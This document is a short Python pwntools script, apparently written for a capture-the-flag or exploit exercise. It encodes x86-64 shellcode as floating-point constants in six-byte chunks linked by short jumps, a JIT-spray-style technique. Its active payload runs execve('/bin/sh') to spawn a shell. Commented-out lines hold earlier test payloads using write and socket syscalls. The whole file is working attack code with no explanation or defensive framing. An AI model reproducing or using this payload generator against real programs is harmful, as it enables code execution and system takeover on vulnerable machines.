from pwn import *


__NR_write = 1
__NR_socket = 41
__NR_exit_group = 231
AF_INET = 2
SOCK_STREAM = 2


def main():
    context(arch="amd64")
    jmp = b"\xeb\x0c"
    shell = u64(b"/bin/sh\x00")

    def out(x):
        y = struct.unpack("<d", x)[0]
        print(str(y) + ",")
        assert struct.pack("<d", y) == x

    def make_double(code):
        assert len(code) <= 6
        out(code.ljust(6, b"\x90") + jmp)

    #make_double(asm("push 1; pop rdi"))
    #make_double(asm("mov rsi, rsp"))
    #make_double(asm("push 0xff; pop rdx"))
    #make_double(asm(f"push {__NR_write}; pop rax"))
    #make_double(asm("syscall"))
    #make_double(asm("push 0; pop rdi"))
    #make_double(asm(f"push {__NR_exit_group}; pop rax"))
    #make_double(asm("syscall"))
    #make_double(asm(f"push {AF_INET}; pop rdi; push {SOCK_STREAM}; pop rsi"))
    #make_double(asm(f"push {__NR_socket}; pop rax; syscall"))
    #make_double(asm("push 0x0a78797a"))
    #make_double(asm("push 1; pop rdi; mov rsi, rsp"))
    #make_double(asm("push 4; pop rdx"))
    #make_double(asm(f"push {__NR_write}; pop rax; syscall"))
    make_double(asm("push %d; pop rax" % (shell >> 0x20)))
    make_double(asm("push %d; pop rdx" % (shell % 0x100000000)))
    make_double(asm("shl rax, 0x20; xor esi, esi"))
    make_double(asm("add rax, rdx; xor edx, edx; push rax"))
    code = asm("mov rdi, rsp; push 59; pop rax; syscall")
    assert len(code) <= 8
    out(code.ljust(8, b"\x90"))


if __name__ == "__main__":
    main()
